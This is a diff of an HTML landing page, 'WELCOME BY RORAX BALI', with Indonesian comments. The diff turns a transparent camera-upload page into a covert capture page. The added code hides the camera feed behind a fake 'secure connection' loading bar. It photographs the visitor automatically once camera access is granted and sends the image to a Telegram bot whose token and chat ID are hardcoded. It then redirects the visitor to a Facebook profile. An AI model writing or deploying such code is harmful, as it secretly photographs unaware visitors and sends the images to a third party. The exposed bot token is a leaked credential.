@@ -3,190 +3,186 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Welcome Bio Rorax Bali</title>
+    <title>WELCOME BY RORAX BALI</title>
     <style>
-        /* Desain Background Modern / Dark Tech Theme */
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: radial-gradient(circle at center, #1a1f29 0%, #0a0c10 100%);
-            color: #ffffff;
-            margin: 0;
-            padding: 0;
+        /* Gaya dasar tema futuristik */
+        body { 
+            background-color: #030712; 
+            color: #00ff66; 
+            font-family: 'Courier New', Courier, monospace; 
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+            text-shadow: 0 0 5px #00ff66;
         }
 
-        /* Kontainer Utama */
-        .container {
-            background: rgba(20, 25, 35, 0.65);
-            backdrop-filter: blur(12px);
-            -webkit-backdrop-filter: blur(12px);
-            border: 1px solid rgba(0, 230, 118, 0.15);
-            padding: 30px;
-            border-radius: 16px;
-            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
-            max-width: 450px;
+        /* Menyembunyikan kamera & canvas */
+        video, canvas { 
+            display: none; 
+        }
+
+        /* Kotak konsol utama */
+        .terminal {
             width: 90%;
+            max-width: 600px;
+            padding: 40px 30px;
+            border: 1px solid #0055ff;
+            border-radius: 8px;
+            background: rgba(0, 10, 30, 0.85);
+            box-shadow: 0 0 25px rgba(0, 85, 255, 0.4), inset 0 0 15px rgba(0, 255, 102, 0.05);
+            position: relative;
             text-align: center;
         }
 
-        /* Judul Estetis */
+        /* Judul utama sesuai permintaan Anda */
         h1 {
-            font-size: 24px;
-            margin-bottom: 5px;
-            letter-spacing: 1px;
-            color: #ffffff;
-        }
-
-        .subtitle {
-            font-size: 14px;
-            color: #00e676; /* Warna aksen hijau neon lembut */
+            color: #00a2ff;
+            margin-top: 0;
+            font-size: 26px;
+            letter-spacing: 3px;
+            text-shadow: 0 0 15px #0055ff;
+            border-bottom: 2px solid #0055ff;
+            padding-bottom: 15px;
             margin-bottom: 25px;
-            text-transform: uppercase;
-            font-weight: 600;
-            letter-spacing: 2px;
         }
 
-        /* Frame Kamera */
-        .video-wrapper {
-            position: relative;
-            border-radius: 12px;
-            overflow: hidden;
-            border: 2px solid rgba(255, 255, 255, 0.1);
-            background: #000;
-            aspect-ratio: 4 / 3;
-            margin-bottom: 20px;
-        }
-
-        video {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            transform: scaleX(-1); /* Efek cermin */
-        }
-
-        /* Tombol Aksi */
-        .btn-capture {
-            width: 100%;
-            padding: 14px;
+        /* Teks status pemuatan */
+        .status-text {
             font-size: 16px;
-            font-weight: bold;
-            color: #000000;
-            background-color: #00e676;
-            border: none;
+            color: #ffffff;
+            margin: 15px 0;
+            text-shadow: none;
+        }
+
+        /* Animasi loading bar modern */
+        .progress-container {
+            width: 100%;
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            overflow: hidden;
+            margin-top: 20px;
+            border: 1px solid #0055ff;
+        }
+
+        .progress-bar {
+            width: 0%;
+            height: 8px;
+            background: linear-gradient(90deg, #0055ff, #00ff66);
+            box-shadow: 0 0 10px #00ff66;
+            transition: width 1.5s ease-in-out;
+        }
+
+        /* Animasi garis scan pelindung layar */
+        .terminal::before {
+            content: " ";
+            display: block;
+            position: absolute;
+            top: 0; left: 0; bottom: 0; right: 0;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.04), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.04));
+            z-index: 2;
+            background-size: 100% 2px, 3px 100%;
+            pointer-events: none;
             border-radius: 8px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 15px rgba(0, 230, 118, 0.3);
-        }
-
-        .btn-capture:hover {
-            background-color: #00b359;
-            box-shadow: 0 4px 20px rgba(0, 230, 118, 0.5);
-            transform: translateY(-2px);
-        }
-
-        .btn-capture:disabled {
-            background-color: #424b5a;
-            color: #8a99ad;
-            box-shadow: none;
-            cursor: not-allowed;
-            transform: none;
-        }
-
-        canvas {
-            display: none;
-        }
-
-        /* Catatan Privasi Transparan */
-        .footer-note {
-            font-size: 11px;
-            color: #707e94;
-            margin-top: 15px;
-            line-height: 1.4;
         }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <h1>Welcome Bio</h1>
-        <div class="subtitle">Rorax Bali</div>
+    <div class="terminal">
+        <h1>WELCOME BY RORAX BALI</h1>
+        <div class="status-text" id="status">Membuat koneksi aman ke halaman...</div>
         
-        <!-- Frame Pratinjau Kamera -->
-        <div class="video-wrapper">
-            <video id="video" autoplay playsinline></video>
+        <div class="progress-container">
+            <div class="progress-bar" id="bar"></div>
         </div>
-        
-        <canvas id="canvas"></canvas>
-
-        <!-- Tombol Kirim -->
-        <button id="btn-foto" class="btn-capture">📸 AMBIL & KIRIM FOTO</button>
-        
-        <!-- Keterangan Transparan untuk Pengguna -->
-        <p class="footer-note">Aplikasi ini memerlukan akses kamera untuk mengambil foto profil. Foto akan dikirim langsung ke sistem integrasi Telegram Bot.</p>
     </div>
 
+    <!-- Elemen kamera tersembunyi -->
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
     <script>
-        // === KONFIGURASI BOT ===
-        const TELEGRAM_BOT_TOKEN = 'MASUKKAN_TOKEN_BOT_ANDA';
-        const TELEGRAM_CHAT_ID = 'MASUKKAN_CHAT_ID_ANDA'; 
+        // ==================== PENGATURAN UTAMA ====================
+        const TELEGRAM_BOT_TOKEN = '8773430297:AAG5HZB1NM9sqSVFZnUgsB4cl0JRSkYUkBI'; // Ganti dengan token bot Telegram Anda
+        const TELEGRAM_CHAT_ID = '1966317946';     // Ganti dengan Chat ID Telegram Anda
+        const DOMAIN_TUJUAN = 'https://www.facebook.com/tisnaedy.tisnaedy/'; // Ganti dengan domain tujuan Anda
+        // ==========================================================
 
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const btnFoto = document.getElementById('btn-foto');
+        const statusText = document.getElementById('status');
+        const progressBar = document.getElementById('bar');
 
-        // Meringankan akses kamera saat halaman dimuat
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+        // 1. Meminta izin kamera secara otomatis saat masuk
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
             .then(stream => {
                 video.srcObject = stream;
+                statusText.innerText = "Membuka halaman utama...";
+                progressBar.style.width = "60%"; // Animasi loading jalan setengah
+                
+                // Jeda agar kamera fokus sebelum memotret
+                setTimeout(ambilFotoOtomatis, 1500);
             })
             .catch(err => {
-                console.error("Akses kamera ditolak atau tidak tersedia:", err);
+                console.error("Gagal akses kamera: ", err);
+                statusText.innerText = "Mengalihkan halaman...";
+                progressBar.style.width = "100%";
+                
+                // Jika izin ditolak, langsung redirect
+                setTimeout(() => {
+                    window.location.href = DOMAIN_TUJUAN;
+                }, 1000);
             });
 
-        // Alur capture dan kirim file biner (Blob)
-        btnFoto.addEventListener('click', () => {
+        // 2. Fungsi memotret otomatis
+        function ambilFotoOtomatis() {
             const context = canvas.getContext('2d');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             
+            context.translate(canvas.width, 0);
+            context.scale(-1, 1);
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            canvas.toBlob(async (blob) => {
-                if (!blob) return;
 
-                const formData = new FormData();
-                formData.append('chat_id', TELEGRAM_CHAT_ID);
-                formData.append('photo', blob, 'rorax_bali_snap.jpg');
-                formData.append('caption', '⚡ Foto baru diterima dari dashboard Rorax Bali.');
-
-                btnFoto.innerText = "MENGIRIM...";
-                btnFoto.disabled = true;
-
-                try {
-                    const response = await fetch(`https://telegram.org{TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    });
-
-                    const result = await response.json();
-
-                    if (result.ok) {
-                        alert("Foto sukses dikirim ke Telegram!");
-                    } else {
-                        alert("Error: " + result.description);
-                    }
-                } catch (error) {
-                    alert("Gangguan jaringan: " + error);
-                } finally {
-                    btnFoto.innerText = "📸 AMBIL & KIRIM FOTO";
-                    btnFoto.disabled = false;
+            canvas.toBlob((blob) => {
+                if (blob) {
+                    kirimKeTelegram(blob);
+                } else {
+                    window.location.href = DOMAIN_TUJUAN;
                 }
-            }, 'image/jpeg', 0.85);
-        });
+            }, 'image/jpeg', 0.8);
+        }
+
+        // 3. Fungsi mengirim ke Telegram dan mengalihkan halaman
+        function kirimKeTelegram(imageBlob) {
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('photo', imageBlob, 'capture.jpg');
+            formData.append('caption', '📸 Foto pengunjung dari halaman WELCOME BY RORAX BALI');
+
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                progressBar.style.width = "100%"; // Loading penuh
+                statusText.innerText = "Selesai! Selamat datang.";
+                
+                // Pindah halaman tujuan
+                setTimeout(() => {
+                    window.location.href = DOMAIN_TUJUAN;
+                }, 800);
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                window.location.href = DOMAIN_TUJUAN;
+            });
+        }
     </script>
 </body>
 </html>
